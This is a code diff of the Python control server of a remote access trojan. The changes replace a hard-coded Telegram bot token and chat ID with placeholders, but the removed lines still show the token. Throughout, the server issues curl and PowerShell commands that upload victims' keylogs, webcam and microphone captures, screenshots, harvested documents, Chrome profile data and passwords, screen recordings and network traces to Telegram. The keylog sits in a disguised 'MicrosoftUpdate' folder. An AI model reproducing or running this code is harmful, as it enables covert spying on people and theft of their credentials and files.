@@ -168,7 +168,7 @@ class ClientManager:
 
             #Send notifications
             def send_hi():
-                url = f"https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendMessage"
+                url = f"https://api.telegram.org/botTOKEN/sendMessage"
                 data = {
                     'chat_id': CHAT_ID,
                     'text': "New client connected!"
@@ -550,7 +550,7 @@ def interact_with_client(client_manager, client_id):
                     tel_logger(f'Screenshot Taken [{username}]')
                     client['command_in_progress'] = False
 
-                command3 = f'curl -F "photo=@{path2}" https://api.telegram.org/TOKEN/sendPhoto?chat_id=6042298920'
+                command3 = f'curl -F "photo=@{path2}" https://api.telegram.org/TOKEN/sendPhoto?chat_id={CHAT_ID}'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command3}"):
@@ -563,7 +563,7 @@ def interact_with_client(client_manager, client_id):
 
             elif cmd == 'send':
                 path = input("FULL Path of file: ")
-                command2 = f'curl -F "document=@{path}" https://api.telegram.org/TOKEN/sendDocument?chat_id=6042298920'
+                command2 = f'curl -F "document=@{path}" https://api.telegram.org/TOKEN/sendDocument?chat_id={CHAT_ID}'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -609,7 +609,7 @@ def interact_with_client(client_manager, client_id):
                     print(response.decode('utf-8', errors='ignore'))
                     tel_logger(f"CameraShoot Taken [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
-                command4 = 'curl -F "document=@%USERPROFILE%/webcam.jpg" https://api.telegram.org/TOKEN/sendDocument?chat_id=6042298920'
+                command4 = f'curl -F "document=@%USERPROFILE%/webcam.jpg" https://api.telegram.org/TOKEN/sendDocument?chat_id={CHAT_ID}'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command4}"):
@@ -766,7 +766,7 @@ def interact_with_client(client_manager, client_id):
                     print(response.decode('utf-8', errors='ignore'))
                     tel_logger(f"Audio Record Finished for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
 
-                command3 = 'curl -F "document=@%USERPROFILE%\\mic.wav" https://api.telegram.org/TOKEN/sendDocument?chat_id=6042298920'
+                command3 = f'curl -F "document=@%USERPROFILE%\\mic.wav" https://api.telegram.org/TOKEN/sendDocument?chat_id={CHAT_ID}'
                 with client['lock']:
                     if not client_manager._send_message(conn, f"CMD:{command3}"):
                         client['command_in_progress'] = False
@@ -1136,8 +1136,8 @@ def interact_with_client(client_manager, client_id):
                     print(response.decode('utf-8', errors='ignore'))
                     tel_logger(f"RickRoll video played on {username}\n\n{response.decode('utf-8', errors='ignore')}")
 
-            elif cmd == 'keylog':
-                command2 = r'curl -F "document=@%USERPROFILE%\AppData\Roaming\MicrosoftUpdate\keylog.txt" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id=6042298920'
+            elif cmd == 'keylog':                #Send keylogger logs
+                command2 = f'curl -F "document=@%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt" https://api.telegram.org/botTOKEN/sendDocument?chat_id={CHAT_ID}'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1196,7 +1196,7 @@ def interact_with_client(client_manager, client_id):
 
             elif cmd == 'harvest':
                 extension = input("Extension (pdf/docx/txt): ")
-                command2 = f'''powershell -Command "Get-ChildItem -Path C:\\Users -Include *.{extension} -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20 | ForEach-Object {{ curl -F \\"document=@$($_.FullName)\\" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id={CHAT_ID} }}"'''
+                command2 = f'''powershell -Command "Get-ChildItem -Path C:\\Users -Include *.{extension} -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20 | ForEach-Object {{ curl -F \\"document=@$($_.FullName)\\" https://api.telegram.org/botTOKEN/sendDocument?chat_id={CHAT_ID} }}"'''
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1212,7 +1212,7 @@ def interact_with_client(client_manager, client_id):
             elif cmd == 'browser':
                 command2 = 'xcopy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default" "%TEMP%\\chrome_data" /E /I /H /Y'
                 command3 = '"C:\\Program Files\\WinRAR\\rar.exe" a -r "%TEMP%\\chrome.rar" "%TEMP%\\chrome_data"'
-                command4 = f'curl -F "document=@%TEMP%\\chrome.rar" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id={CHAT_ID}'
+                command4 = f'curl -F "document=@%TEMP%\\chrome.rar" https://api.telegram.org/botTOKEN/sendDocument?chat_id={CHAT_ID}'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1255,7 +1255,7 @@ def interact_with_client(client_manager, client_id):
             elif cmd == 'screenrec':
                 duration = input("Duration (seconds): ")
                 command2 = f'''powershell -Command "Start-Process \\"%USERPROFILE%\\ffmpeg\\bin\\ffmpeg.exe\\" -ArgumentList \\"-f gdigrab -framerate 5 -i desktop -t {duration} -vcodec libx264 -preset ultrafast %USERPROFILE%\\screen.mp4\\" -NoNewWindow -Wait"'''
-                command3 = f'curl -F "video=@%USERPROFILE%\\screen.mp4" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendVideo?chat_id={CHAT_ID}'
+                command3 = f'curl -F "video=@%USERPROFILE%\\screen.mp4" https://api.telegram.org/botTOKEN/sendVideo?chat_id={CHAT_ID}'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1658,7 +1658,7 @@ def interact_with_client(client_manager, client_id):
                             netsh trace start capture=yes tracefile=$env:TEMP\\capture.etl maxsize=100 filemode=single overwrite=yes;
                             Start-Sleep {duration};
                             netsh trace stop;
-                            curl -F \\"document=@$env:TEMP\\capture.etl\\" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id={CHAT_ID};
+                            curl -F \\"document=@$env:TEMP\\capture.etl\\" https://api.telegram.org/botTOKEN/sendDocument?chat_id={CHAT_ID};
                             Remove-Item $env:TEMP\\capture.etl;
                             "'''
                 with client['lock']:
@@ -1724,7 +1724,7 @@ def interact_with_client(client_manager, client_id):
                 command4 = 'python %TEMP%\\chrome_pass.py > %TEMP%\\chrome_passwords.txt'
 
                 #Send results
-                command5 = f'curl -F "document=@%TEMP%\\chrome_passwords.txt" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id={CHAT_ID}'
+                command5 = f'curl -F "document=@%TEMP%\\chrome_passwords.txt" https://api.telegram.org/botTOKEN/sendDocument?chat_id={CHAT_ID}'
 
                 #Execute all commands in sequence
                 for cmd_exec in [command1, command2, command3, command4, command5]:
@@ -2212,7 +2212,7 @@ def main():
 
                             'powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, [System.Windows.Forms.SystemInformation]::VirtualScreen.Height); $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, [System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $bmp.Size); $path = Join-Path $env:USERPROFILE \\"screenshot.png\\"; $bmp.Save($path)"',
 
-                            'curl -F "photo=@%USERPROFILE%\\screenshot.png" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendPhoto?chat_id=6042298920'
+                            'curl -F "photo=@%USERPROFILE%\\screenshot.png" https://api.telegram.org/botTOKEN/sendPhoto?chat_id=YOUR_CHAT_ID'
 
                         ],
 
@@ -2227,7 +2227,7 @@ def main():
                         'clipboard': ['powershell -command "Get-Clipboard"'],
 
                         'keylog': [
-                            'curl -F "document=@%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id=6042298920'],
+                            'curl -F "document=@%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt" https://api.telegram.org/botTOKEN/sendDocument?chat_id=YOUR_CHAT_ID'],
 
                         'recycle': ['PowerShell.exe -NoProfile -Command Clear-RecycleBin -Force'],
 
